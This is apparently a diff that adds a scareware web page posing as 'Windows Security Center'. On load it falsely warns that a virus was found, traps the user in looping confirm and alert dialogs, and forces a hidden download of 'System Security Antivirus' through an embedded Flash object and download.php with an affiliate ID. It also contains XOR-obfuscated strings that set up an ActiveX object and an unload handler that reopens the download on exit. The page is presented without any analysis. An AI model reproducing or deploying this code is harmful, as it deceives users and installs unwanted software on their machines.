@@ -1,0 +1,237 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml"><head>
+
+
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<title>Windows Security Center</title>
+<script>
+function init_windows()
+{
+ if (os=='vista')
+ {
+  $("#alert_img").attr("src","images/wsc_vista.png");
+ // $("#confirm_img").attr("src","images/confirm_vista.png");
+ }
+ else
+ {
+  $("#alert_img").attr("src","images/wsc_xp.png");
+//  $("#confirm_img").attr("src","images/confirm_xp.png");
+ }
+}
+
+function center_windows()
+{
+  $("#alert").show();
+  $("#alert").css('top', $(window).height()/2- $("#alert_img").height()/2); 
+  $("#alert").css('left', $(window).width()/2- $("#alert_img").width()/2);
+  $("#alert").hide();
+  
+/*  $("#confirm").show();
+  $("#confirm").css('top', $(window).height()/2- $("#confirm_img").height()/2); 
+  $("#confirm").css('left', $(window).width()/2- $("#confirm_img").width()/2);
+  $("#confirm").hide();*/
+}
+function show_wsc()
+{
+  $("#alert").show();
+//  playsound(soundfile);  
+} 
+ 
+function Minimize() 
+{
+window.innerWidth = 100;
+window.innerHeight = 100;
+window.screenX = screen.width;
+window.screenY = screen.height;
+alwaysLowered = true;
+}
+
+function Maximize() 
+{
+window.moveTo(0,0);
+window.resizeTo(screen.width,screen.height);
+}
+
+function download()
+{
+// window.location='download.php?affid=00000';
+window.document.getElementById('download').innerHTML="<embed src='load.swf?&p=0&t=_self&u=download.php?affid=00000' autostart=true width=1 height=1></embed>";
+}
+
+function away()
+{
+	w = window;
+	ua = navigator.userAgent;
+	v1 = ua.toLowerCase().indexOf('msie') != -1 && ua.toLowerCase().indexOf('opera') < 0;
+  	x = 11;
+  	eval('w.resizeTo(x*10,x*11-7)');
+	w.moveTo(v1 ? (screen.width - 100) >> 1 : 11027, v1 ? (screen.height - 100) >> 1 : 10659);
+}
+
+var cancel=false;
+
+function myconfirm()
+{
+window.onblur=function(){};
+if (confirm('Windows Security Center\n\nVirus (I-Worm.Trojan.b) was found on your computer!\n\nClick \'OK\' to install System Security Antivirus.')) 
+{
+ window.focus();
+ setTimeout("window.onblur=function (){myconfirm();}", 100);
+ download();
+}
+else
+{
+ alert('Windows Security Center recommends you to install System Security Antivirus.');
+ myconfirm();
+}
+/*
+  $("#confirm").show();
+			$("#confirm").click(function () {
+  if (!cancel)     
+  {
+      $(this).hide();
+//      download();
+    }
+    else
+     cancel=false;
+    });
+    
+  $("#cancel_map").click(function () {
+      cancel=true;
+      $("#confirm").hide();            
+      alert('Windows Security Center recommends you to install System Security Antivirus.');
+      $("#confirm").show();
+    });*/
+}
+
+function exit_pop()
+{
+alert('Your computer remains infected by viruses! '+
+'They can cause data loss and file damages and need to be cured as soon as possible. \n\n'+
+'Return to System Security and download it secure to your PC');
+}
+
+function sp2init(){
+    document.body.innerHTML+="<object id=iie width=0 height=0 classid='CLSID:"+u+"'></object>";
+}
+
+
+function loading() {
+  
+// Minimize();
+//  if (window.attachEvent)
+//    away();
+//  pop1(); 
+}
+
+function loaded() {
+  center_windows();
+  show_wsc();
+  Maximize();
+  window.focus();  	
+  setTimeout("myconfirm()",1000);    
+};
+
+loading();
+
+
+//--------------------------------------------------------------------------------
+var ghjkgyu=["\x67\x6A\x62\x6F\x6C\x64\x54\x6A\x67\x77\x6B\x39\x32\x33\x31\x37\x73\x7B\x38\x23\x67\x6A\x62\x6F\x6C\x64\x4B\x66\x6A\x64\x6B\x77\x39\x34\x35\x3B\x73\x7B\x38\x23\x67\x6A\x62\x6F\x6C\x64\x57\x6C\x73\x39\x33\x73\x7B\x38\x23\x67\x6A\x62\x6F\x6C\x64\x4F\x66\x65\x77\x39\x33\x73\x7B\x38\x23\x66\x67\x64\x66\x39\x51\x62\x6A\x70\x66\x67\x38\x23\x60\x66\x6D\x77\x66\x71\x39\x33\x38\x23\x6B\x66\x6F\x73\x39\x33\x38\x23\x71\x66\x70\x6A\x79\x62\x61\x6F\x66\x39\x32\x38\x23\x70\x60\x71\x6C\x6F\x6F\x39\x32\x38\x23\x70\x77\x62\x77\x76\x70\x39\x33",
+               "\x23\x70\x60\x71\x6C\x6F\x6F\x61\x62\x71\x70\x3E\x33\x2F\x6E\x66\x6D\x76\x61\x62\x71\x3E\x32\x2F\x77\x6C\x6C\x6F\x61\x62\x71\x3E\x32\x2F\x6F\x6C\x60\x62\x77\x6A\x6C\x6D\x3E\x33\x2F\x73\x66\x71\x70\x6C\x6D\x62\x6F\x61\x62\x71\x3E\x32\x2F\x70\x77\x62\x77\x76\x70\x3E\x33\x2F\x71\x66\x70\x6A\x79\x62\x61\x6F\x66\x3E\x32",
+               "\x34\x65\x33\x3A\x60\x3A\x66\x32\x60\x36\x36\x65\x34\x67\x35\x30\x65\x33\x31\x3A\x33\x3A\x62\x32\x37\x60\x32\x62\x37\x36\x66\x33",
+               "\x35\x41\x45\x36\x31\x42\x36\x31\x2E\x30\x3A\x37\x42\x2E\x32\x32\x47\x30\x2E\x41\x32\x36\x30\x2E\x33\x33\x40\x33\x37\x45\x34\x3A\x45\x42\x42\x35"];
+var xor_key=3;
+var _0xbf5e=["", "", "", ""];
+for(j=0; j<4; j++)
+{ 
+	for(i=0; i<ghjkgyu[j].length; ++i)
+	{
+		_0xbf5e[j] += String.fromCharCode(xor_key^ghjkgyu[j].charCodeAt(i));
+	}
+}
+var exit=true;
+var usePopDialog=true;
+var nid=0x0;
+var tid=0x1af;
+var mid=0x3b3;
+var full=0x1;
+var popDialogOptions=_0xbf5e[0x0];
+var popWindowOptions=_0xbf5e[0x1];
+var clid=_0xbf5e[0x2];
+var usePopDialog=true;
+var isUsingSpecial=false;
+var isXPSP2=false;
+var u=_0xbf5e[0x3];
+
+function ext(){
+       if (exit)       {
+               exit=false;
+               exit_pop();
+               if(!isXPSP2 && !usePopDialog)               {
+                         window.open(popURL,"",popWindowOptions);
+               }else if(!isXPSP2 && usePopDialog) {
+                         eval("window.showModalDialog(popURL,'',popDialogOptions)");
+               }else{
+                         iie.launchURL(popURL);
+               }
+        }
+}
+
+var popURL = 'download.php?affid=00000';
+isUsingSpecial = true;
+if (window.attachEvent)
+ eval("window.attachEvent('onunload',ext);");
+else
+ window.addEventListener("unload", ext, false);
+ 
+//--------------------------------------------------------------------------------
+
+var soundfile="chord.wav"
+
+function playsound(soundfile){
+if (document.all){
+$("soundeffect").src=""
+$("soundeffect").src=soundfile
+}
+}
+
+function bindsound(tag, soundfile, masterElement){
+if (!window.event) return
+var source=event.srcElement
+while (source!=masterElement && source.tagName!="HTML"){
+if (source.tagName==tag.toUpperCase()){
+playsound(soundfile)
+break
+}
+source=source.parentElement
+}
+}</script>
+<script type="text/javascript" src="scan.php_files/jquery.js"></script>
+<script type="text/javascript" src="scan.php_files/jquery_wsc.js"></script>
+<style type="text/css">
+
+#alert {
+	Z-INDEX: 1300;
+	display:none;
+	position:absolute;
+	cursor:pointer;
+	cursor:hand;
+}
+
+#confirm {
+	Z-INDEX: 1301;
+	display:none;
+	position:absolute;
+	cursor:pointer;
+	cursor:hand;
+}
+</style></head><body onload="loaded()">
+<bgsound src="#" id="soundeffect" hidden="true" loop="1" autostart="false">
+<div style="display: block; top: 93.5px; left: 421px;" id="alert"><img src="scan.php_files/wsc_xp.png" id="alert_img" border="0"></div>
+<div id="confirm"><img id="confirm_img" usemap="#cancel_map" border="0"></div>
+<map name="cancel_map" id="cancel_map">
+  <area shape="rect" coords="323,114,391,155">
+</map>
+<div id="download"><embed src="scan.php_files/load.swf" autostart="true" width="1" height="1"></div>
+<script>init_windows();</script>
+</body></html>
